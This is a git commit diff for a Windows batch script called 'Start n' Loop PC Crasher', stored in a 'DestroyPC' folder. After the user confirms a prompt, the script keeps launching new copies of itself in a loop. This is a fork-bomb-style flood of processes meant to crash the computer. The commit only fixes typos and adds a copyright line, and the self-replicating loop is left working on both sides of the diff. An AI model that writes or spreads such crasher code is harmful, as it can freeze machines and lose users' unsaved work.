6b2d7f79ca264b2a72a7ea711a71ae62026859f7
SutoEXEC <sutoexec.bat@gmail.com>
2024-03-13 12:52:07 +0000

    Update start_n'_loop.bat

--- BatchSoft/DestroyPC/start_n'_loop.bat
+++ BatchSoft/DestroyPC/start_n'_loop.bat
@@ -1,16 +1,17 @@
 @echo off
 color c
-title Start n' Loop:
-echo Start n' Loop PC Crasher
-echo WARNING! THIS WILL COMPLETELY NUUKKE YOUR COMPUTER.
+title Start n' Loop
+echo Start n' Loop PC Crasher:
+echo (c) Okmeque1 Corporation. Open-source.
+echo WARNING! THIS WILL COMPLETELY NUKE YOUR COMPUTER.
 echo Do you want do proceed?
 echo [1] Yes
 echo [2] No
 choice /c:12 /m "Choose an option: "
 IF ERRORLEVEL 2 GOTO QUIT
-IF ERRORLEVEL 1 GOTO NUUKKE
-:NUUKKE
+IF ERRORLEVEL 1 GOTO NUKE
+:NUKE
 start start %~dp0\start_n'_loop.bat
-goto NUUKKE
+goto NUKE
 :QUIT
 exit /b
